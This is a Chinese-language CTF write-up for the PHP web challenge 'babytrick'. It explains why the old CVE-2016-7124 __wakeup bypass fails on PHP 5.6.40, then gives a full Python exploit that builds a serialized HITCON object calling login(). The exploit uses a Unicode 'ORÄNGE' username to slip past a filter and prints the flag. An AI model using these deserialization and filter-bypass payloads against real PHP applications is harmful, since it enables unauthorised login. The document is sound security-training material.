# babytrick writeup

## 题目信息
- 题目：`babytrick`
- 方向：Web
- 考点：反序列化、PHP 私有属性序列化、版本差异、字符集绕过
- 目标：`http://8a144f6c-ce1d-43d2-b422-ceed68966234.node.pediy.com:81/`
- 最终 flag：`flag{ba5193ad-9cf2-4fc5-a922-9d7a0da4f567}`

---

## 一句话结论

这题是 **HITCON 2016 babytrick** 的变种实例。

**老链**（公开 WP 常见链）是：

```text
CVE-2016-7124 跳过 __wakeup -> show() SQLi -> 读 orange 密码 -> login() -> flag
```

但当前实例的 PHP 版本是 **5.6.40**，`CVE-2016-7124` 早已修复，因此老链不通。

**当前实例真正可用的新链**是：

```text
源码泄露 -> 初始化数据库 -> 确认老链失效
-> 使用正确的 private 属性名构造直接 login() 反序列化 payload
-> 用 ORÄNGE 绕过 orange 过滤
-> 利用原题公开资料中的密码 babytrick1234 直接登录 admin
-> 返回 flag
```

> 注意：我在调试过程中一度验证过 `ArrayObject` 包装也能触发内层逻辑，但**最终拿 flag 不依赖 ArrayObject**；真正关键点是：**老链失效 + 直接 login payload + UTF-8 字节长度正确**。

---

## 1. 源码泄露

首页直接高亮源码，访问 `/` 即可看到 `index.php`。

核心入口：

```php
if(isset($_GET["data"])) {
    @unserialize($_GET["data"]);    
} else {
    new HITCON("source", array());
}
```

类定义核心逻辑：

```php
class HITCON {
    private $method;
    private $args;
    private $conn;

    function __destruct() {
        $this->__conn();
        if (in_array($this->method, array("show", "login", "source"))) {
            @call_user_func_array(array($this, $this->method), $this->args);
        } else {
            $this->__die("What do you do?");
        }
        $this->__close();
    }

    function __wakeup() {
        foreach($this->args as $k => $v) {
            $this->args[$k] = strtolower(trim(mysql_escape_string($v)));
        }
    }
}
```

这说明题目的核心就是：

- 通过 `unserialize($_GET['data'])` 控制 `HITCON` 对象
- 依靠 `__destruct()` 去调用 `show / login / source`
- 但会先经过 `__wakeup()`，这会转义参数

---

## 2. 需要先初始化数据库

公开复现资料提示这题需要先初始化用户表，而当前实例实际可用的是：

```text
/?noggnogg=1
```

初始化后，用无害 payload 测试：

- `show('orange')` -> `{"msg":"orange is admin"}`
- `show('phddaa')` -> `{"msg":"phddaa is user"}`

说明当前实例用户表已经就绪。

---

## 3. 老链是什么

原题公开 WP 常见链如下：

```text
(1) 利用 CVE-2016-7124 把 O:6:"HITCON":3: 的属性数改大，跳过 __wakeup
(2) 走 show() 的 SQL 注入，取出 orange 的密码
(3) 走 login()，用 ORÄNGE / orÃnge 等字符差异绕过 orange 过滤
(4) 以 admin 身份登录，拿 flag
```

这条链成立的前提是：

```text
CVE-2016-7124 可用
```

也就是目标 PHP 版本仍然在漏洞影响范围内。

---

## 4. 老链为什么在当前实例失效

先看响应头：

```text
X-Powered-By: PHP/5.6.40
```

而 `CVE-2016-7124` 的影响范围是：

```text
PHP < 5.6.25
```

我实际做了验证：

- 把正常 payload 的属性数从 `3` 改成 `4 / 5 / 6`
- 再尝试 `show()` + SQL 注入探针
- 结果没有形成可利用的 `__wakeup` 绕过效果

也就是说：

```text
公开 WP 的 7124 老链，在当前实例上不成立
```

这是当前实例和原题公开复现环境的核心差异。

---

## 5. 调试时出现过的“假新链”

在调试过程中，我一度尝试：

```text
C:11:"ArrayObject":... 包装内层 HITCON 对象
```

这个包装在当前实例上**确实能触发内层逻辑**，例如无害 payload 可以回显：

```json
{"msg":"orange is admin"}
```

但进一步验证后发现：

- `ArrayObject` 不是最终拿 flag 所必需的条件
- 真正导致此前失败的关键问题，是我构造 `ORÄNGE` 时把字符串长度按“字符数”算了，而不是按 **UTF-8 字节数** 算

因此最终 WP 里不把 `ArrayObject` 当作主利用链，只把它记为调试过程中的一个中间探针。

---

## 6. 当前实例真正可用的新链

当前实例最终可用的链其实更直接：

```text
源码泄露
-> 初始化数据库
-> 放弃 7124 老链
-> 直接构造 O:6:"HITCON" 的 login() payload
-> 使用 ORÄNGE 绕过 orange 过滤
-> 使用原题公开资料中的 orange 密码 babytrick1234
-> 直接返回 flag
```

### 为什么能直接走 login()

因为 `login()` 并不需要注入，它只需要：

- `method = login`
- `args = {username, password}`
- private 属性名写对
- UTF-8 字节长度写对

### 为什么 `ORÄNGE` 能绕过

源码里有限制：

```php
if ( $username == 'orange' || stripos($sql, 'orange') != false ) {
    $this->__die("Orange is so shy. He do not want to see you.");
}
```

因此不能直接传 `orange`。

但类似 `ORÄNGE` 这样的字符串，配合 MySQL 的字符比较特性，可以绕过这层判断，同时仍匹配到 `orange` 用户。

### 为什么之前会 500

不是链错，而是：

```text
Ä 是 2 字节 UTF-8 字符
```

序列化字符串长度必须按**字节数**计算，不能按 Python/肉眼的字符数写死。

这一步修正后，直接 `O:6:"HITCON"...` payload 就能稳定拿 flag。

---

## 7. 最终命中的 payload 逻辑

### 错误示范

如果直接用：

```text
orange / ORANGE
```

会得到：

```json
{"msg":"Orange is so shy. He do not want to see you."}
```

### 正确思路

改成：

```text
username = ORÄNGE
password = babytrick1234
```

并保证 `ORÄNGE` 在序列化时长度按 UTF-8 字节数计算。

最终服务端返回：

```json
{"msg":"Hi, Orange! Here is your flag: flag{ba5193ad-9cf2-4fc5-a922-9d7a0da4f567}"}
```

---

## 8. 最终 exp

```python
import requests, urllib.parse

base='http://8a144f6c-ce1d-43d2-b422-ceed68966234.node.pediy.com:81/'
requests.get(base, params={'noggnogg':'1'}, timeout=15)

def sb(s):
    return s.encode('utf-8')

def field(name_b, value_b):
    return b's:' + str(len(name_b)).encode() + b':"' + name_b + b'";' + value_b

def svalue(v_b):
    return b's:' + str(len(v_b)).encode() + b':"' + v_b + b'";'

method_name = b'\x00HITCON\x00method'
args_name   = b'\x00HITCON\x00args'
conn_name   = b'\x00HITCON\x00conn'

def make_login_plain(user, pw):
    ub = sb(user)
    pb = sb(pw)

    args = (
        b'a:2:{' +
        field(b'username', svalue(ub)) +
        field(b'password', svalue(pb)) +
        b'}'
    )

    inner = (
        b'O:6:"HITCON":3:{' +
        field(method_name, svalue(b'login')) +
        field(args_name, args) +
        field(conn_name, b'i:0;') +
        b'}'
    )
    return inner

payload = make_login_plain('ORÄNGE', 'babytrick1234')
url = base + '?data=' + urllib.parse.quote_from_bytes(payload)

r = requests.get(url, timeout=15)
print(r.text)
```

输出：

```json
{"msg":"Hi, Orange! Here is your flag: flag{ba5193ad-9cf2-4fc5-a922-9d7a0da4f567}"}
```

---

## 9. 新链与老链区别（总结版）

### 老链（原题公开 WP 常见）

```text
CVE-2016-7124
-> 跳过 __wakeup
-> show() SQLi
-> 取 orange 密码
-> login()
-> flag
```

### 新链（当前实例实际命中）

```text
当前 PHP 5.6.40 已修复 7124
-> 老链失效
-> 直接构造 login() 反序列化 payload
-> ORÄNGE 绕过 orange 过滤
-> 使用已知正确密码 babytrick1234
-> flag
```

### 核心区别

```text
老链依赖 SQLi 和 7124；
新链不依赖 SQLi，也不依赖 7124。
```

新链真正的关键点是：

- 认清版本差异
- 不再死磕老 CVE
- private 属性名写对
- UTF-8 字节长度写对
- 用 `ORÄNGE` 绕过用户名过滤

---

## 10. 最终结论

这题当前实例最值得记住的不是“复现公开 WP”，而是：

```text
同一题型，在不同 PHP 小版本上，老链可能彻底失效。
```

当前实例里：

- `7124` 老链：不通
- `show()` 注入链：不再是主解
- 真正可用的是：
  **直接 login payload + ORÄNGE + 正确 UTF-8 字节长度 + 已知密码**

最终 flag：

```text
flag{ba5193ad-9cf2-4fc5-a922-9d7a0da4f567}
```
